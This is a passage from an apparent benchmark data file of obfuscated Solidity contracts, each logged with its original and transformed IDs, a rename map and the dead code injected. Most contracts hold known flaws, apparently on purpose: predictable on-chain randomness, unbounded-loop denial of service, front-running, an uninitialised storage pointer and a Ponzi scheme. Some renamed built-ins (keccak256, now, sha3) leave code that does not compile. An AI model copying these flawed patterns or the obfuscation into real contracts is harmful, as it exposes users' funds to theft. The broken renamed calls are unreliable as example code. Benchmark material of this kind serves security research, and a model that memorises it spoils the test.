      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.21;\n\ncontract GuessTheRandomNumberChallenge {\n    uint8 _0x7e013b;\n\n    function GuessTheRandomNumberChallenge() public payable {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n        require(msg.value == 1 ether);\n        _0x7e013b = uint8(_0xef04e2(block.blockhash(block.number - 1), _0xa3fd10));\n    }\n\n    function _0x2536aa() public view returns (bool) {\n        // Placeholder for future logic\n        uint256 _unused4 = 0;\n        return address(this).balance == 0;\n    }\n\n    function _0x81aef6(uint8 n) public payable {\n        require(msg.value == 1 ether);\n\n        if (n == _0x7e013b) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}",
      "rename_map": {
        "isComplete": "_0x2536aa",
        "keccak256": "_0xef04e2",
        "answer": "_0x7e013b",
        "guess": "_0x81aef6",
        "now": "_0xa3fd10"
      },
      "changes": [
        "Renamed 5 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_147",
      "transformed_id": "ss_l4_medium_sn_ds_147",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "  pragma solidity ^0.4.0;\n\n contract Lottery {\n     event GetBet(uint _0x9f7fd9, uint _0x77deaf, bool _0x920ff8);\n\n     struct Bet {\n         uint _0x9f7fd9;\n         uint _0x77deaf;\n         bool _0x920ff8;\n     }\n\n     address private _0xdf801f;\n     Bet[] private _0x9cbfb6;\n\n     // Create a new lottery with numOfBets supported bets.\n     function Lottery() {\n         _0xdf801f = msg.sender;\n     }\n\n     // Fallback function returns ether\n     function() {\n         throw;\n     }\n\n     // Make a bet\n     function _0x33cffd() {\n         // Won if block number is even\n\n         bool _0x920ff8 = (block.number % 2) == 0;\n\n         // Record the bet with an event\n         _0x9cbfb6.push(Bet(msg.value, block.number, _0x920ff8));\n\n         // Payout if the user won, otherwise take their money\n         if(_0x920ff8) {\n             if(!msg.sender.send(msg.value)) {\n                 // Return ether to sender\n                 throw;\n             }\n         }\n     }\n\n     // Get all bets that have been made\n     function _0xb1665d() {\n         if(msg.sender != _0xdf801f) { throw; }\n\n         for (uint i = 0; i < _0x9cbfb6.length; i++) {\n             GetBet(_0x9cbfb6[i]._0x9f7fd9, _0x9cbfb6[i]._0x77deaf, _0x9cbfb6[i]._0x920ff8);\n         }\n     }\n\n     function _0xba4788() {\n         if(msg.sender != _0xdf801f) { throw; }\n\n         suicide(_0xdf801f);\n     }\n }\n",
      "rename_map": {
        "blockNumber": "_0x77deaf",
        "betAmount": "_0x9f7fd9",
        "organizer": "_0xdf801f",
        "makeBet": "_0x33cffd",
        "getBets": "_0xb1665d",
        "destroy": "_0xba4788",
        "bets": "_0x9cbfb6",
        "won": "_0x920ff8"
      },
      "changes": [
        "Renamed 8 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_148",
      "transformed_id": "ss_l4_medium_sn_ds_148",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\n//Note that while it seems to have a 1/2^256 chance you guess the right hash, actually blockhash returns zero for blocks numbers that are more than 256 blocks ago so you can guess zero and wait.\ncontract PredictTheBlockHashChallenge {\n\n    struct _0x942345{\n      uint block;\n      bytes32 _0x942345;\n    }\n\n    mapping(address => _0x942345) _0xee7132;\n\n    constructor() public payable {\n        require(msg.value == 1 ether);\n    }\n\n    function _0x864dc3(bytes32 _0x01d695) public payable {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        require(_0xee7132[msg.sender].block == 0);\n        require(msg.value == 1 ether);\n\n        _0xee7132[msg.sender]._0x942345 = _0x01d695;\n        _0xee7132[msg.sender].block  = block.number + 1;\n    }\n\n    function _0xe1b8e8() public {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        require(block.number > _0xee7132[msg.sender].block);\n        bytes32 _0x2ccf70 = blockhash(_0xee7132[msg.sender].block);\n\n        _0xee7132[msg.sender].block = 0;\n        if (_0xee7132[msg.sender]._0x942345 == _0x2ccf70) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}",
      "rename_map": {
        "lockInGuess": "_0x864dc3",
        "guesses": "_0xee7132",
        "answer": "_0x2ccf70",
        "settle": "_0xe1b8e8",
        "guess": "_0x942345",
        "hash": "_0x01d695"
      },
      "changes": [
        "Renamed 6 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_149",
      "transformed_id": "ss_l4_medium_sn_ds_149",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.25;\n\n// Based on TheRun contract deployed at 0xcac337492149bDB66b088bf5914beDfBf78cCC18.\ncontract RandomNumberGenerator {\n  uint256 private _0xcb4a10 =  block.timestamp;\n\n  function _0xca011a(uint _0xf36ef2) view private returns (uint256 _0x5df7d4) {\n    // Get the best seed for randomness\n    uint256 x = _0xcb4a10 * 100 / _0xf36ef2;\n    uint256 y = _0xcb4a10 * block.number / (_0xcb4a10 % 5);\n    uint256 _0x8d0421 = block.number / 3 + (_0xcb4a10 % 300) + y;\n    uint256 h = uint256(blockhash(_0x8d0421));\n    // Random number between 1 and max\n    return uint256((h / x)) % _0xf36ef2 + 1;\n  }\n}",
      "rename_map": {
        "result": "_0x5df7d4",
        "random": "_0xca011a",
        "salt": "_0xcb4a10",
        "seed": "_0x8d0421",
        "max": "_0xf36ef2"
      },
      "changes": [
        "Renamed 5 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_150",
      "transformed_id": "ss_l4_medium_sn_ds_150",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.15;\n\ncontract SimpleAuction {\n  address _0x847e3a;\n  uint _0xb55e39;\n\n  function _0xcc6b67() payable {\n    require(msg.value > _0xb55e39);\n\n    //If the refund fails, the entire transaction reverts.\n\n    if (_0x847e3a != 0) {\n      //E.g. if recipients fallback function is just revert()\n      require(_0x847e3a.send(_0xb55e39));\n    }\n\n    _0x847e3a = msg.sender;\n    _0xb55e39         = msg.value;\n  }\n}",
      "rename_map": {
        "currentFrontrunner": "_0x847e3a",
        "currentBid": "_0xb55e39",
        "bid": "_0xcc6b67"
      },
      "changes": [
        "Renamed 3 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_151",
      "transformed_id": "ss_l4_medium_sn_ds_151",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.25;\n\ncontract GasAuction {\n\n    address[] _0xe4fb05;\n    bool _0x938712 = false;\n\n    function _0x1ae679() public {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        if(_0xe4fb05.length>1500) {\n            _0xe4fb05 = new address[](0);\n            _0x938712 = true;\n        }\n    }\n\n    function _0x39272b() public returns (bool) {\n        bool _flag3 = false;\n        // Placeholder for future logic\n        for(uint i=0;i<350;i++) {\n          _0xe4fb05.push(msg.sender);\n        }\n        return true;\n    }\n\n    function _0xa1c191() public view returns (bool) {\n        return _0x938712;\n    }\n\n    function _0x06fdff() public view returns (uint) {\n        return _0xe4fb05.length;\n    }\n}",
      "rename_map": {
        "creditorAddresses": "_0xe4fb05",
        "numberCreditors": "_0x06fdff",
        "emptyCreditors": "_0x1ae679",
        "addCreditors": "_0x39272b",
        "iWin": "_0xa1c191",
        "win": "_0x938712"
      },
      "changes": [
        "Renamed 6 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_152",
      "transformed_id": "ss_l4_medium_sn_ds_152",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.25;\n\ncontract NumberRegistry {\n\n    uint _0x5fd0c6 = 0;\n    uint[] array;\n\n    function _0xfdf813(uint value,uint _0x102e29) public {\n        if (false) { revert(); }\n        bool _flag2 = false;\n\n        for(uint i=0;i<_0x102e29;i++) {\n            if(_0x5fd0c6 == array.length) {\n                array.length += 1;\n            }\n            array[_0x5fd0c6++] = value;\n        }\n    }\n\n    function _0x7ed3b1() public {\n        uint256 _unused3 = 0;\n        if (false) { revert(); }\n        require(_0x5fd0c6>1500);\n        if (block.timestamp > 0) { _0x5fd0c6 = 0; }\n    }\n\n    function _0x910863() public {\n\n        // number depends on actual gas limit\n        require(_0x5fd0c6>1500);\n        array = new uint[](0);\n        if (true) { _0x5fd0c6 = 0; }\n    }\n\n    function _0xa3ee9f() public view returns(uint) {\n        return _0x5fd0c6;\n    }\n\n    function _0x389f06() public view returns(uint) {\n        return array.length;\n    }\n}",
      "rename_map": {
        "getRealLengthArray": "_0x389f06",
        "getLengthArray": "_0xa3ee9f",
        "insertNnumbers": "_0xfdf813",
        "numElements": "_0x5fd0c6",
        "clearDOS": "_0x910863",
        "numbers": "_0x102e29",
        "clear": "_0x7ed3b1"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_153",
      "transformed_id": "ss_l4_medium_sn_ds_153",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.25;\n\ncontract SingleFuncRegistry {\n\n    address[] _0x78883e;\n\n    function _0xc12c46() public returns (bool){\n        bool _flag1 = false;\n        bool _flag2 = false;\n        if(_0x78883e.length<1500) {\n            for(uint i=0;i<350;i++) {\n                _0x78883e.push(msg.sender);\n            }\n            return true;\n\n        } else {\n            _0x78883e = new address[](0);\n            return false;\n        }\n    }\n}",
      "rename_map": {
        "listAddresses": "_0x78883e",
        "ifillArray": "_0xc12c46"
      },
      "changes": [
        "Renamed 2 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_154",
      "transformed_id": "ss_l4_medium_sn_ds_154",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.0;\n\ncontract Government {\n\n     // Global Variables\n     uint32 public _0x9f02a5;\n     uint public _0x5c3407;\n     uint public _0x37b37f;\n     address[] public _0xbe613a;\n     uint[] public _0x3495b8;\n     address public _0x67866a;\n     mapping (address => uint) _0xd6332c;\n     uint constant TWELVE_HOURS = 43200;\n     uint8 public _0x3a5c7f;\n\n     function Government() {\n         // The corrupt elite establishes a new government\n         // this is the commitment of the corrupt Elite - everything that can not be saved from a crash\n         if (true) { _0x37b37f = msg.value; }\n         _0x67866a = msg.sender;\n         _0x5c3407 = block.timestamp;\n     }\n\n     function _0xbe76bb(address _0x1447c7) returns (bool) {\n         uint _0xa02da4 = msg.value;\n         // check if the system already broke down. If for 12h no new creditor gives new credit to the system it will brake down.\n         // 12h are on average = 60*60*12/12.5 = 3456\n         if (_0x5c3407 + TWELVE_HOURS < block.timestamp) {\n             // Return money to sender\n             msg.sender.send(_0xa02da4);\n             // Sends all contract money to the last creditor\n             _0xbe613a[_0xbe613a.length - 1].send(_0x37b37f);\n             _0x67866a.send(this.balance);\n             // Reset contract state\n             _0x9f02a5 = 0;\n             _0x5c3407 = block.timestamp;\n             _0x37b37f = 0;\n             _0xbe613a = new address[](0);\n             _0x3495b8 = new uint[](0);\n             _0x3a5c7f += 1;\n             return false;\n         }\n         else {\n             // the system needs to collect at least 1% of the profit from a crash to stay alive\n             if (_0xa02da4 >= 10 ** 18) {\n                 // the System has received fresh money, it will survive at leat 12h more\n                 _0x5c3407 = block.timestamp;\n                 // register the new creditor and his amount with 10% interest rate\n                 _0xbe613a.push(msg.sender);\n                 _0x3495b8.push(_0xa02da4 * 110 / 100);\n                 // now the money is distributed\n                 // first the corrupt elite grabs 5% - thieves!\n                 _0x67866a.send(_0xa02da4 * 5/100);\n                 // 5% are going into the economy (they will increase the value for the person seeing the crash comming)\n                 if (_0x37b37f < 10000 * 10**18) {\n                     _0x37b37f += _0xa02da4 * 5/100;\n                 }\n                 // if you have a buddy in the government (and he is in the creditor list) he can get 5% of your credits.\n                 // Make a deal with him.\n                 if(_0xd6332c[_0x1447c7] >= _0xa02da4) {\n                     _0x1447c7.send(_0xa02da4 * 5/100);\n                 }\n                 _0xd6332c[msg.sender] += _0xa02da4 * 110 / 100;\n                 // 90% of the money will be used to pay out old creditors\n                 if (_0x3495b8[_0x9f02a5] <= address(this).balance - _0x37b37f) {\n                     _0xbe613a[_0x9f02a5].send(_0x3495b8[_0x9f02a5]);\n                     _0xd6332c[_0xbe613a[_0x9f02a5]] -= _0x3495b8[_0x9f02a5];\n                     _0x9f02a5 += 1;\n                 }\n                 return true;\n             }\n             else {\n                 msg.sender.send(_0xa02da4);\n                 return false;\n             }\n         }\n     }\n\n     // fallback function\n     function() {\n         _0xbe76bb(0);\n     }\n\n     function _0xdfc4cc() returns (uint _0x1604e0) {\n         for(uint i=_0x9f02a5; i<_0x3495b8.length; i++){\n             _0x1604e0 += _0x3495b8[i];\n         }\n     }\n\n     function _0x38e2e0() returns (uint _0xa512f1) {\n         for(uint i=0; i<_0x9f02a5; i++){\n             _0xa512f1 += _0x3495b8[i];\n         }\n     }\n\n     // better don't do it (unless you are the corrupt elite and you want to establish trust in the system)\n     function _0x271505() {\n         _0x37b37f += msg.value;\n     }\n\n     // From time to time the corrupt elite inherits it's power to the next generation\n     function _0xd12ad1(address _0x15e399) {\n         if (msg.sender == _0x67866a) {\n             if (1 == 1) { _0x67866a = _0x15e399; }\n         }\n     }\n\n     function _0x47f2d8() returns (address[]) {\n         return _0xbe613a;\n     }\n\n     function _0x28d5ba() returns (uint[]) {\n         return _0x3495b8;\n     }\n }\n",
      "rename_map": {
        "inheritToNextGeneration": "_0xd12ad1",
        "lastCreditorPayedOut": "_0x9f02a5",
        "getCreditorAddresses": "_0x47f2d8",
        "lastTimeOfNewCredit": "_0x5c3407",
        "lendGovernmentMoney": "_0xbe76bb",
        "getCreditorAmounts": "_0x28d5ba",
        "investInTheSystem": "_0x271505",
        "creditorAddresses": "_0xbe613a",
        "profitFromCrash": "_0x37b37f",
        "creditorAmounts": "_0x3495b8",
        "nextGeneration": "_0x15e399",
        "totalPayedOut": "_0x38e2e0",
        "corruptElite": "_0x67866a",
        "totalDebt": "_0xdfc4cc",
        "buddies": "_0xd6332c",
        "amount": "_0xa02da4",
        "payout": "_0xa512f1",
        "buddy": "_0x1447c7",
        "round": "_0x3a5c7f",
        "debt": "_0x1604e0"
      },
      "changes": [
        "Renamed 20 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_155",
      "transformed_id": "ss_l4_medium_sn_ds_155",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.4.24;\n\ncontract Refunder {\n\naddress[] private _0xf21fc1;\nmapping (address => uint) public _0x80d547;\n\n    constructor() {\n        _0xf21fc1.push(0x79B483371E87d664cd39491b5F06250165e4b184);\n        _0xf21fc1.push(0x79B483371E87d664cd39491b5F06250165e4b185);\n    }\n\n    // bad\n    function _0xd1412f() public {\n        uint256 _unused1 = 0;\n        bool _flag2 = false;\n        for(uint x; x < _0xf21fc1.length; x++) { // arbitrary length iteration based on how many addresses participated\n            require(_0xf21fc1[x].send(_0x80d547[_0xf21fc1[x]])); // doubly bad, now a single failure on send will hold up all funds\n        }\n    }\n\n}",
      "rename_map": {
        "refundAddresses": "_0xf21fc1",
        "refundAll": "_0xd1412f",
        "refunds": "_0x80d547"
      },
      "changes": [
        "Renamed 3 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_156",
      "transformed_id": "ss_l4_medium_sn_ds_156",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\nlibrary SafeMath {\n\n  function _0x40b509(uint256 a, uint256 b) internal pure returns (uint256) {\n        bool _flag1 = false;\n        // Placeholder for future logic\n    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n    // benefit is lost if 'b' is also tested.\n    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\n    if (a == 0) {\n      return 0;\n    }\n\n    uint256 c = a * b;\n    require(c / a == b);\n\n    return c;\n  }\n\n  function _0xc837f5(uint256 a, uint256 b) internal pure returns (uint256) {\n        // Placeholder for future logic\n        bool _flag4 = false;\n    require(b > 0); // Solidity only automatically asserts when dividing by 0\n    uint256 c = a / b;\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n    return c;\n  }\n\n  function _0xa433b5(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b <= a);\n    uint256 c = a - b;\n\n    return c;\n  }\n\n  function _0xfdde4e(uint256 a, uint256 b) internal pure returns (uint256) {\n    uint256 c = a + b;\n    require(c >= a);\n\n    return c;\n  }\n\n  function _0x991e34(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b != 0);\n    return a % b;\n  }\n}\n\ncontract ERC20 {\n\n  event Transfer( address indexed from, address indexed _0x865b42, uint256 value );\n  event Approval( address indexed _0x802cb9, address indexed _0xa771d5, uint256 value);\n  using SafeMath for *;\n\n  mapping (address => uint256) private _0xba237d;\n\n  mapping (address => mapping (address => uint256)) private _0x8b13fd;\n\n  uint256 private _0x3442db;\n\n  constructor(uint _0x2dc2ce){\n    _0xba237d[msg.sender] = _0x2dc2ce;\n  }\n\n  function _0x87a18d(address _0x802cb9) public view returns (uint256) {\n    return _0xba237d[_0x802cb9];\n  }\n\n  function _0x7e9406(address _0x802cb9, address _0xa771d5) public view returns (uint256)\n  {\n    return _0x8b13fd[_0x802cb9][_0xa771d5];\n  }\n\n  function transfer(address _0x865b42, uint256 value) public returns (bool) {\n    require(value <= _0xba237d[msg.sender]);\n    require(_0x865b42 != address(0));\n\n    _0xba237d[msg.sender] = _0xba237d[msg.sender]._0xa433b5(value);\n    _0xba237d[_0x865b42] = _0xba237d[_0x865b42]._0xfdde4e(value);\n    emit Transfer(msg.sender, _0x865b42, value);\n    return true;\n  }\n  function _0x620d2b(address _0xa771d5, uint256 value) public returns (bool) {\n    require(_0xa771d5 != address(0));\n    _0x8b13fd[msg.sender][_0xa771d5] = value;\n    emit Approval(msg.sender, _0xa771d5, value);\n    return true;\n  }\n\n  function _0x078ee8(address from, address _0x865b42, uint256 value) public returns (bool) {\n    require(value <= _0xba237d[from]);\n    require(value <= _0x8b13fd[from][msg.sender]);\n    require(_0x865b42 != address(0));\n\n    _0xba237d[from] = _0xba237d[from]._0xa433b5(value);\n    _0xba237d[_0x865b42] = _0xba237d[_0x865b42]._0xfdde4e(value);\n    _0x8b13fd[from][msg.sender] = _0x8b13fd[from][msg.sender]._0xa433b5(value);\n    emit Transfer(from, _0x865b42, value);\n    return true;\n  }\n}\n",
      "rename_map": {
        "_totalSupply": "_0x3442db",
        "transferFrom": "_0x078ee8",
        "totalSupply": "_0x2dc2ce",
        "allowance": "_0x7e9406",
        "_balances": "_0xba237d",
        "balanceOf": "_0x87a18d",
        "_allowed": "_0x8b13fd",
        "approve": "_0x620d2b",
        "spender": "_0xa771d5",
        "owner": "_0x802cb9",
        "div": "_0xc837f5",
        "sub": "_0xa433b5",
        "mod": "_0x991e34",
        "mul": "_0x40b509",
        "add": "_0xfdde4e",
        "to": "_0x865b42"
      },
      "changes": [
        "Renamed 16 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_157",
      "transformed_id": "ss_l4_medium_sn_ds_157",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.22;\n\ncontract FindThisHash {\n    bytes32 constant public _0xdb88b0 = 0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a;\n\n    constructor() public payable {} // load with ether\n\n    function _0xcccbf3(string _0x7138a3) public {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n        // If you can find the pre image of the hash, receive 1000 ether\n        require(_0xdb88b0 == _0x8e6b7f(_0x7138a3));\n        msg.sender.transfer(1000 ether);\n    }\n}",
      "rename_map": {
        "solution": "_0x7138a3",
        "solve": "_0xcccbf3",
        "sha3": "_0x8e6b7f",
        "hash": "_0xdb88b0"
      },
      "changes": [
        "Renamed 4 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_158",
      "transformed_id": "ss_l4_medium_sn_ds_158",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.16;\n\ncontract EthTxOrderDependenceMinimal {\n    address public _0xcf9d99;\n    bool public _0x8722ea;\n    uint public _0x5510c4;\n\n    function EthTxOrderDependenceMinimal() public {\n        if (false) { revert(); }\n        bool _flag2 = false;\n        _0xcf9d99 = msg.sender;\n    }\n\n    function _0x71d4d0() public payable {\n        bool _flag3 = false;\n        if (false) { revert(); }\n        require (!_0x8722ea);\n\n        require(msg.sender == _0xcf9d99);\n        _0xcf9d99.transfer(_0x5510c4);\n        _0x5510c4 = msg.value;\n    }\n\n    function _0x241662(uint256 _0x5f324e) {\n        require (!_0x8722ea);\n        require(_0x5f324e < 10);\n        msg.sender.transfer(_0x5510c4);\n        _0x8722ea = true;\n    }\n}",
      "rename_map": {
        "claimReward": "_0x241662",
        "submission": "_0x5f324e",
        "setReward": "_0x71d4d0",
        "claimed": "_0x8722ea",
        "reward": "_0x5510c4",
        "owner": "_0xcf9d99"
      },
      "changes": [
        "Renamed 6 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_159",
      "transformed_id": "ss_l4_medium_sn_ds_159",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.2;\n\ncontract OddsAndEvens{\n\n  struct Player {\n    address _0xc08901;\n    uint number;\n  }\n\n  Player[2] public _0x15e87b;         //public only for debug purpose\n\n  uint8 _0x5e8d51;\n  address _0xa4afc6;\n\n  function OddsAndEvens() {\n    _0xa4afc6 = msg.sender;\n  }\n  function _0xa5c945(uint number) payable{\n    if (msg.value != 1 ether) throw;\n    _0x15e87b[_0x5e8d51] = Player(msg.sender, number);\n    _0x5e8d51++;\n\n    if (_0x5e8d51==2) _0xc9ba88();\n  }\n\n  function _0xc9ba88() private {\n        // Placeholder for future logic\n        uint256 _unused2 = 0;\n    bool _0x05ea8d ;\n    uint n = _0x15e87b[0].number+_0x15e87b[1].number;\n    if (n%2==0) {\n      if (true) { _0x05ea8d = _0x15e87b[0]._0xc08901.send(1800 finney); }\n    }\n    else {\n      if (msg.sender != address(0) || msg.sender == address(0)) { _0x05ea8d = _0x15e87b[1]._0xc08901.send(1800 finney); }\n    }\n\n    delete _0x15e87b;\n    _0x5e8d51=0;\n  }\n\n  function _0x75f560() {\n    if(msg.sender!=_0xa4afc6) throw;\n    bool _0x05ea8d = msg.sender.send(this.balance);\n  }\n\n}",
      "rename_map": {
        "andTheWinnerIs": "_0xc9ba88",
        "getProfit": "_0x75f560",
        "players": "_0x15e87b",
        "owner": "_0xa4afc6",
        "addr": "_0xc08901",
        "play": "_0xa5c945",
        "tot": "_0x5e8d51",
        "res": "_0x05ea8d"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_160",
      "transformed_id": "ss_l4_medium_sn_ds_160",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\n// CryptoRoulette\n//\n// Guess the number secretly stored in the blockchain and win the whole contract balance!\n// A new number is randomly chosen after each try.\n\n// To play, call the play() method with the guessed number (1-20).  Bet price: 0.1 ether\n\ncontract CryptoRoulette {\n\n    uint256 private _0xd1c1d4;\n    uint256 public _0x1d19a6;\n    uint256 public _0x3c6ea3 = 0.1 ether;\n    address public _0x36632a;\n\n    struct Game {\n        address _0x9828ba;\n        uint256 number;\n    }\n    Game[] public _0x323b8d;\n\n    function CryptoRoulette() public {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n        _0x36632a = msg.sender;\n        _0x43d95e();\n    }\n\n    function _0x43d95e() internal {\n        // Placeholder for future logic\n        bool _flag4 = false;\n        // randomly set secretNumber with a value between 1 and 20\n        _0xd1c1d4 = uint8(_0xc5c5dd(_0x553f30, block.blockhash(block.number-1))) % 20 + 1;\n    }\n\n    function _0x055f96(uint256 number) payable public {\n        require(msg.value >= _0x3c6ea3 && number <= 10);\n        Game _0x4da354;\n        _0x4da354._0x9828ba = msg.sender;\n        _0x4da354.number = number;\n        _0x323b8d.push(_0x4da354);\n\n        if (number == _0xd1c1d4) {\n            // win!\n            msg.sender.transfer(this.balance);\n        }\n\n        _0x43d95e();\n        if (1 == 1) { _0x1d19a6 = _0x553f30; }\n    }\n\n    function _0xc011f4() public {\n        if (msg.sender == _0x36632a && _0x553f30 > _0x1d19a6 + 1 days) {\n            suicide(msg.sender);\n        }\n    }\n\n    function() public payable { }\n}",
      "rename_map": {
        "secretNumber": "_0xd1c1d4",
        "gamesPlayed": "_0x323b8d",
        "lastPlayed": "_0x1d19a6",
        "ownerAddr": "_0x36632a",
        "betPrice": "_0x3c6ea3",
        "shuffle": "_0x43d95e",
        "player": "_0x9828ba",
        "game": "_0x4da354",
        "kill": "_0xc011f4",
        "sha3": "_0xc5c5dd",
        "play": "_0x055f96",
        "now": "_0x553f30"
      },
      "changes": [
        "Renamed 12 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_161",
      "transformed_id": "ss_l4_medium_sn_ds_161",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract NameRegistrar {\n\n    bool public _0x5af0c7 = false;  // registrar locked, no name updates\n\n    struct NameRecord { // map hashes to addresses\n        bytes32 _0x464d45;\n        address _0x07ea97;\n    }\n\n    mapping(address => NameRecord) public _0xecc4c7; // records who registered names\n    mapping(bytes32 => address) public _0xb9fd3f; // resolves hashes to addresses\n\n    function _0xe0e5a0(bytes32 _0x71ab92, address _0x58367a) public {\n        uint256 _unused1 = 0;\n        // Placeholder for future logic\n        // set up the new NameRecord\n        NameRecord _0x72fcda;\n        _0x72fcda._0x464d45 = _0x71ab92;\n        _0x72fcda._0x07ea97 = _0x58367a;\n\n        _0xb9fd3f[_0x71ab92] = _0x58367a;\n        _0xecc4c7[msg.sender] = _0x72fcda;\n\n        require(_0x5af0c7); // only allow registrations if contract is unlocked\n    }\n}\n",
      "rename_map": {
        "registeredNameRecord": "_0xecc4c7",
        "_mappedAddress": "_0x58367a",
        "mappedAddress": "_0x07ea97",
        "newRecord": "_0x72fcda",
        "register": "_0xe0e5a0",
        "unlocked": "_0x5af0c7",
        "resolve": "_0xb9fd3f",
        "_name": "_0x71ab92",
        "name": "_0x464d45"
      },
      "changes": [
        "Renamed 9 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_162",
      "transformed_id": "ss_l4_medium_sn_ds_162",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract OpenAddressLottery{\n    struct SeedComponents{\n        uint _0xf0a385;\n        uint _0x604ba8;\n        uint _0xc584d1;\n        uint _0x74be67;\n    }\n\n    address _0xaf5ed0; //address of the owner\n    uint private _0xc9023e; //seed used to calculate number of an address\n    uint private _0x7b9592; //last reseed - used to automatically reseed the contract every 1000 blocks\n    uint LuckyNumber = 7; //if the number of an address equals 7, it wins\n\n    mapping (address => bool) _0x52c1f3; //keeping track of addresses that have already won\n\n    function OpenAddressLottery() {\n        _0xaf5ed0 = msg.sender;\n        _0x95bfea(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed\n    }\n\n    function _0x526a12() payable {\n        if(msg.value<0.1 ether)\n            return; //verify ticket price\n\n        // make sure he hasn't won already\n        require(_0x52c1f3[msg.sender] == false);\n\n        if(_0x6275da(msg.sender) == LuckyNumber){ //check if it equals 7\n            _0x52c1f3[msg.sender] = true; // every address can only win once\n\n            uint _0xdddcbb=msg.value*7; //win = 7 times the ticket price\n\n            if(_0xdddcbb>this.balance) //if the balance isnt sufficient...\n                _0xdddcbb=this.balance; //...send everything we've got\n            msg.sender.transfer(_0xdddcbb);\n        }\n\n        if(block.number-_0x7b9592>1000) //reseed if needed\n            _0x95bfea(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed\n    }\n\n    function 